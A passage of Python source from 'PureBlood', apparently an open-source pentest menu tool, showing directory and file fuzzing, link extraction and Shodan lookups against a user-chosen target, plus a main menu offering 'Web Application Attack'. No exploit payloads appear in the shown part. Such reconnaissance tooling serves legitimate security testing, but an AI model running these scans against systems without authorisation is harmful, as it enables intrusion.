int(sizex))\n        print (reset + bold)\n        print (wp_subnet_lookup)\n        print (reset)\n        print ('{0}='.format(red) * int(sizex))\n        web_pentest()\n    elif choice == 13:\n        try:\n            wp_links_extract = cweb_pentest.links_extract(url)\n        except NameError:\n            print ('\\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))\n            time.sleep(2)\n            web_pentest()\n        print ('{0}='.format(red) * int(sizex))\n        web_pentest_outputfile.write('[+] Links Extract Result - ' + url)\n        web_pentest_outputfile.write('\\n============================================================')\n        print (reset + bold)\n        print (wp_links_extract)\n        web_pentest_outputfile.write('\\n' + wp_links_extract)\n        print (reset)\n        print ('{0}='.format(red) * int(sizex))\n        web_pentest_outputfile.write('\\n')\n        web_pentest_outputfile.write('============================================================\\n')\n        web_pentest()\n    elif choice == 14:\n        if sys.version_info[0] == 3:\n            directory_list = str(input('{0}PureBlood{1}>{0}WebPentest{1}>{0}DirectoryFuzz{1}>({3}Directory List{1})> {2}'.format(green, blue, cyan, red)))\n        if sys.version_info[0] == 2:\n            directory_list = str(raw_input('{0}PureBlood{1}>{0}WebPentest{1}>{0}DirectoryFuzz{1}>({3}Directory List{1})> {2}'.format(green, blue, cyan, red)))\n        try:\n            wp_directory_fuzz1, wp_directory_fuzz2, wp_directory_fuzz3 = cweb_pentest.directory_fuzz(url, directory_list)\n        except NameError:\n            print ('\\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))\n            time.sleep(2)\n            web_pentest()\n        print ('{0}='.format(red) * int(sizex))\n        web_pentest_outputfile.write('[+] Directory Fuzz Result - ' + url)\n        web_pentest_outputfile.write('\\n============================================================')\n        print (reset + bold)\n        web_pentest_outputfile.write('\\n')\n        web_pentest_outputfile.write('Response 200:\\n')\n        print ('[+] Response 200')\n        for i in wp_directory_fuzz1:\n            print (i)\n            web_pentest_outputfile.write(i + '\\n')\n        web_pentest_outputfile.write('Response 301 / 302:\\n')\n        print ('[+] Response 301 / 302')\n        for i in wp_directory_fuzz2:\n            print (i)\n            web_pentest_outputfile.write(i + '\\n')\n        web_pentest_outputfile.write('[+] Response 403:\\n')\n        print ('[+] Response 403')\n        for i in wp_directory_fuzz3:\n            print (i)\n            web_pentest_outputfile.write(i + '\\n')\n        print (reset)\n        print ('{0}='.format(red) * int(sizex))\n        web_pentest_outputfile.write('\\n')\n        web_pentest_outputfile.write('============================================================\\n')\n        web_pentest()\n    elif choice == 15:\n        if sys.version_info[0] == 3:\n            file_list = str(input('{0}PureBlood{1}>{0}WebPentest{1}>{0}FileFuzz{1}>({3}File List{1})> {2}'.format(green, blue, cyan, red)))\n        if sys.version_info[0] == 2:\n            file_list = str(raw_input('{0}PureBlood{1}>{0}WebPentest{1}>{0}FileFuzz{1}>({3}File List{1})> {2}'.format(green, blue, cyan, red)))\n        try:\n            wp_file_fuzz1, wp_file_fuzz2, wp_file_fuzz3 = cweb_pentest.file_fuzz(url, file_list)\n        except NameError:\n            print ('\\n{2}[{1}!{2}] {3}- {4}Please set the target first. {1}95{2}) {4}Set Target{0}'.format(reset, green, blue, yellow, cyan))\n            time.sleep(2)\n            web_pentest()\n        print ('{0}='.format(red) * int(sizex))\n        web_pentest_outputfile.write('[+] File Fuzz Result - ' + url)\n        web_pentest_outputfile.write('\\n============================================================')\n        print (reset + bold)\n        web_pentest_outputfile.write('\\n')\n        web_pentest_outputfile.write('Response 200:\\n')\n        print ('[+] Response 200')\n        for i in wp_file_fuzz1:\n            print (i)\n            web_pentest_outputfile.write(i + '\\n')\n        web_pentest_outputfile.write('Response 301 / 302:\\n')\n        print ('[+] Response 301 / 302')\n        for i in wp_file_fuzz2:\n            print (i)\n            web_pentest_outputfile.write(i + '\\n')\n        web_pentest_outputfile.write('Response 403:\\n')\n        print ('[+] Response 403')\n        for i in wp_file_fuzz3:\n            print (i)\n            web_pentest_outputfile.write(i + '\\n')\n        print (reset)\n        print ('{0}='.format(red) * int(sizex))\n        web_pentest_outputfile.write('\\n')\n        web_pentest_outputfile.write('============================================================\\n')\n        web_pentest()\n    elif choice == 16:\n        if sys.version_info[0] == 3:\n            shodan_search_query = str(input('{0}PureBlood{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Query{1})> {2}'.format(green, blue, cyan, red)))\n            SHODAN_API_KEY = str(input('{0}PureBlood{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Shodan API Key{1})> {2}'.format(green, blue, cyan, red)))\n            shodan_search_output_filename = str(input('{0}PureBlood{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Output{1})> {2}'.format(green, blue, cyan, red)))\n            if '.txt' not in shodan_search_output_filename:\n                shodan_search_output_filename = shodan_search_output_filename + '.txt'\n            else:\n                shodan_search_output_filename = shodan_search_output_filename\n        if sys.version_info[0] == 2:\n            shodan_search_query = str(raw_input('{0}PureBlood{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Query{1})> {2}'.format(green, blue, cyan, red)))\n            SHODAN_API_KEY = str(input('{0}PureBlood{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Shodan API Key{1})> {2}'.format(green, blue, cyan, red)))\n            shodan_search_output_filename = str(input('{0}PureBlood{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Output{1})> {2}'.format(green, blue, cyan, red)))\n            if '.txt' not in shodan_search_output_filename:\n                shodan_search_output_filename = shodan_search_output_filename + '.txt'\n            else:\n                shodan_search_output_filename = shodan_search_output_filename\n        shodan_search_output = open('outputs/web_pentest/shodan/' + shodan_search_output_filename, 'a+')\n        shodan_search_output.write('[#] - ' + month + ' ' + mday + ' ' + current_time + '\\n')\n        wp_shodan_search = cweb_pentest.shodan_search(shodan_search_query, SHODAN_API_KEY)\n        print ('{0}='.format(red) * int(sizex))\n        print (reset + bold)\n        print ('------------------------------.\\n{1}[{2}#{1}] {3}- {4}Results Found: {5}|\\n------------------------------.{0}'.format(reset, blue, green, yellow, cyan, str(wp_shodan_search['total'])))\n        shodan_search_output.write('\\n------------------------------.\\n[#] - Results Found: {5}|\\n------------------------------.\\n'.format(reset, blue, green, yellow, cyan, str(wp_shodan_search['total'])))\n        for i in wp_shodan_search['matches']:\n            try:\n                print (\"\"\"{6}[{7}#{6}] {8}- {9}Timestamp:{10} {0}\n{6}[{7}+{6}] {8}- {9}IP:{10} {1}\n{6}[{7}+{6}] {8}- {9}Port:{10} {2}\n{6}[{7}+{6}] {8}- {9}OS:{10} {3}\n{6}[{7}+{6}] {8}- {9}Hostnames:{10} {4}\n{6}[{7}+{6}] {8}- {9}Data:{10}\n{5}\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\"\"\".format(i['timestamp'], i['ip_str'], str(i['port']), i['os'], i['hostnames'], i['data'], blue, green, yellow, cyan, reset))\n                shodan_search_output.write(\"\"\"[#] - Timestamp: {0}\n[+] - IP: {1}\n[+] - Port: {2}\n[+] - OS: {3}\n[+] - Hostnames: {4}\n[+] - Data:\n{5}\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\n\"\"\".format(i['timestamp'], i['ip_str'], str(i['port']), i['os'], i['hostnames'], i['data'], blue, green, yellow, cyan, reset))\n            except:\n                pass\n        shodan_search_output.write('\\n\\n')\n        shodan_search_output.close()\n        print ('\\n[+] - Output saved in outputs/web_pentest/shodan/' + shodan_search_output_filename)\n        print (reset)\n        print ('{0}='.format(red) * int(sizex))\n        web_pentest()\n    elif choice == 17:\n        if sys.version_info[0] == 3:\n            shodan_host = str(input('{0}PureBlood{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Host{1})> {2}'.format(green, blue, cyan, red)))\n            SHODAN_API_KEY = str(input('{0}PureBlood{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Shodan API Key{1})> {2}'.format(green, blue, cyan, red)))\n            shodan_host_lookup_output_filename = str(input('{0}PureBlood{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Output{1})> {2}'.format(green, blue, cyan, red)))\n            if '.txt' not in shodan_host_lookup_output_filename:\n                shodan_host_lookup_output_filename = shodan_host_lookup_output_filename + '.txt'\n            else:\n                shodan_host_lookup_output_filename = shodan_host_lookup_output_filename\n        if sys.version_info[0] == 2:\n            shodan_host = str(raw_input('{0}PureBlood{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Host{1})> {2}'.format(green, blue, cyan, red)))\n            SHODAN_API_KEY = str(input('{0}PureBlood{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Shodan API Key{1})> {2}'.format(green, blue, cyan, red)))\n            shodan_host_lookup_output_filename = str(input('{0}PureBlood{1}>{0}WebPentest{1}>{0}ShodanSearch{1}>({3}Output{1})> {2}'.format(green, blue, cyan, red)))\n            if '.txt' not in shodan_host_lookup_output_filename:\n                shodan_host_lookup_output_filename = shodan_host_lookup_output_filename + '.txt'\n            else:\n                shodan_host_lookup_output_filename = shodan_host_lookup_output_filename\n        shodan_host_lookup_output = open('outputs/web_pentest/shodan/' + shodan_host_lookup_output_filename, 'a+')\n        shodan_host_lookup_output.write('[#] - ' + month + ' ' + mday + ' ' + current_time + '\\n')\n        wp_shodan_host_lookup = cweb_pentest.shodan_host_lookup(shodan_host, SHODAN_API_KEY)\n        print ('{0}='.format(red) * int(sizex))\n        print (reset + bold)\n        print (\"\"\"--------------------------.\\n{1}[{2}#{1}] {3}- {4}General Information:{0}|\\n--------------------------.\n{1}[{2}#{1}] {3}- {4}IP:{0} {5}\n{1}[{2}#{1}] {3}- {4}Ports:{0} {6}\n{1}[{2}#{1}] {3}- {4}Tags:{0} {7}\n{1}[{2}#{1}] {3}- {4}City:{0} {8}\n{1}[{2}#{1}] {3}- {4}Country:{0} {9}\n{1}[{2}#{1}] {3}- {4}Organization:{0} {10}\n{1}[{2}#{1}] {3}- {4}ISP:{0} {11}\n{1}[{2}#{1}] {3}- {4}Last Update:{0} {12}\n{1}[{2}#{1}] {3}- {4}Hostnames:{0} {13}\n{1}[{2}#{1}] {3}- {4}ASN:{0} {14}\n\"\"\".format(reset, blue, green, yellow, cyan, wp_shodan_host_lookup['ip_str'], str(wp_shodan_host_lookup['ports']).replace('[','').replace(']',''), str(wp_shodan_host_lookup['tags']).replace('[','').replace(']',''), wp_shodan_host_lookup.get('city', 'N/A'), wp_shodan_host_lookup.get('country_name', 'N/A'), wp_shodan_host_lookup.get('org', 'N/A'), wp_shodan_host_lookup.get('isp', 'N/A'), wp_shodan_host_lookup.get('last_update', 'N/A'), str(wp_shodan_host_lookup.get('hostnames', 'N/A')).replace('[','').replace(']',''), wp_shodan_host_lookup.get('asn', 'N/A')))\n        shodan_host_lookup_output.write(\"\"\"--------------------------.\\n[#] - General Information:|\\n--------------------------.\n[#] - IP: {5}\n[#] - Ports: {6}\n[#] - Tags: {7}\n[#] - City: {8}\n[#] - Country: {9}\n[#] - Organization: {10}\n[#] - ISP: {11}\n[#] - Last Update: {12}\n[#] - Hostnames: {13}\n[#] - ASN: {14}\n\"\"\".format(reset, blue, green, yellow, cyan, wp_shodan_host_lookup['ip_str'], str(wp_shodan_host_lookup['ports']).replace('[','').replace(']',''), str(wp_shodan_host_lookup['tags']).replace('[','').replace(']',''), wp_shodan_host_lookup.get('city', 'N/A'), wp_shodan_host_lookup.get('country_name', 'N/A'), wp_shodan_host_lookup.get('org', 'N/A'), wp_shodan_host_lookup.get('isp', 'N/A'), wp_shodan_host_lookup.get('last_update', 'N/A'), str(wp_shodan_host_lookup.get('hostnames', 'N/A')).replace('[','').replace(']',''), wp_shodan_host_lookup.get('asn', 'N/A')))\n        print ('------------------------.\\n{1}[{2}#{1}] {3}- {4}Services / Banner:|\\n------------------------.{0}'.format(reset, blue, green, yellow, cyan))\n        shodan_host_lookup_output.write('\\n------------------------.\\n[#] - Services / Banner:|\\n------------------------.\\n'.format(reset, blue, green, yellow, cyan))\n        for i in wp_shodan_host_lookup['data']:\n            print (\"\"\"{1}[{2}#{1}] {3}- {4}Timestamp:{0} {5}\n{1}[{2}+{1}] {3}- {4}Port:{0} {6}\n{1}[{2}+{1}] {3}- {4}Transport:{0} {7}\n{1}[{2}+{1}] {3}- {4}Data:{0}\n{8}\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\"\"\".format(reset, blue, green, yellow, cyan, i['timestamp'], i['port'], i['transport'], i['data']))\n            shodan_host_lookup_output.write(\"\"\"[#] - Timestamp: {5}\n[+] - Port: {6}\n[+] - Transport: {7}\n[+] - Data:\n{8}\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\n\"\"\".format(reset, blue, green, yellow, cyan, i['timestamp'], i['port'], i['transport'], i['data']))\n        shodan_host_lookup_output.write('\\n\\n')\n        shodan_host_lookup_output.close()\n        print ('\\n[+] - Output saved in outputs/web_pentest/shodan/' + shodan_host_lookup_output_filename)\n        print (reset)\n        print ('{0}='.format(red) * int(sizex))\n        web_pentest()\n    elif choice == 90:\n        main()\n    elif choice == 95:\n        print ('{2}[{1}#{2}] {3}- {4}Please don\\'t put "/" in the end of the Target.{0}'.format(reset, green, blue, yellow, cyan))\n        if sys.version_info[0] == 3:\n            target = str(input('{0}PureBlood{1}>{0}WebPentest{1}>({3}Target{1})> {2}'.format(green, blue, cyan, red)))\n        if sys.version_info[0] == 2:\n            target = str(raw_input('{0}PureBlood{1}>{0}WebPentest{1}>({3}Target{1})> {2}'.format(green, blue, cyan, red)))\n        if '://' in target:\n            ohostname = target.replace('https://', '').replace('http://', '')\n        else:\n            ohostname = target\n        web_pentest_output = ohostname + '-' + month + mday + '.txt'\n        web_pentest_outputfile = open('outputs/web_pentest/' + web_pentest_output, 'a+')\n        web_pentest_outputfile.write('\\n\\n\\n[#] - ' + month + ' ' + mday + ' ' + current_time + '\\n')\n        set_target(target, 1)\n    elif choice == 99:\n        print ('\\n[+] - Output saved in outputs/web_pentest/' + web_pentest_output)\n        print ('\\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))\n        sys.exit()\n    else:\n        print ('\\n{2}[{1}+{2}] {3}- {1}Please enter a valid choice!{0}'.format(reset, red, blue, yellow))\n        time.sleep(2)\n        print ('')\n        web_pentest()\n\n\n\ndef main():\n    print (\"\"\"{3}[ {5}PureBlood Menu {3}]\n\n    {2}01{3}) {5}Web Pentest / Information Gathering\n    {2}02{3}) {5}Web Application Attack\n    {2}03{3}) {5}Generator\n    {2}99{3}) {5}Exit\n{0}\"\"\".format(reset, red, green, blue, yellow, cyan))\n    if sys.version_info[0] == 3:\n        try:\n            choice = int(input('{0}PureBlood{1}> {2}'.format(green, blue, cyan)))\n        except KeyboardInterrupt:\n            print ('\\n\\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))\n            sys.exit()\n        except ValueError:\n            print ('\\n{2}[{1}+{2}] {3}- {1}Please enter a valid number!{0}'.format(reset, red, blue, yellow))\n            time.sleep(2)\n            print ('')\n            main()\n    elif sys.version_info[0] == 2:\n        try:\n            choice = int(raw_input('{0}PureBlood{1}> {2}'.format(green, blue, cyan)))\n        except KeyboardInterrupt:\n            print ('\\n\\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))\n            sys.exit()\n        except ValueError:\n            print ('\\n{2}[{1}+{2}] {3}- {1}Please enter a valid number!{0}'.format(reset, red, blue, yellow))\n            time.sleep(2)\n            print ('')\n            main()\n    if choice == 1:\n        web_pentest()\n    elif choice == 2:\n        web_application_attack()\n    elif choice == 3:\n        generator()\n    elif choice == 99:\n        print ('{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))\n        sys.exit()\n    else:\n        print ('\\n{2}[{1}+{2}] {3}- {1}Please enter a valid choice!{0}'.format(reset, red, blue, yellow))\n        time.sleep(2)\n        print ('')\n        main()\n\n\n\nif __name__ == '__main__':\n    if not os.path.exists('outputs'):\n        os.mkdir('outputs')\n    else:\n        pass\n    if not os.path.exists('outputs/generator'):\n        os.mkdir('outputs/generator')\n    else:\n        pass\n    if not os.path.exists('outputs/web_pentest'):\n        os.mkdir('outputs/web_pentest')\n    else:\n        pass\n    if not os.path.exists('outputs/web_pentest/shodan'):\n        os.mkdir('outputs/web_pentest/shodan')\n    else:\n        pass\n    if not os.path.exists('outputs/web_application_attack'):\n        os.mkdir('outputs/web_application_attack')\n    else:\n        pass\n    if not os.path.exists('external'):\n        os.mkdir('external')\n    else:\n        pass\n    clear()\n    banner()\n    main()\n""")
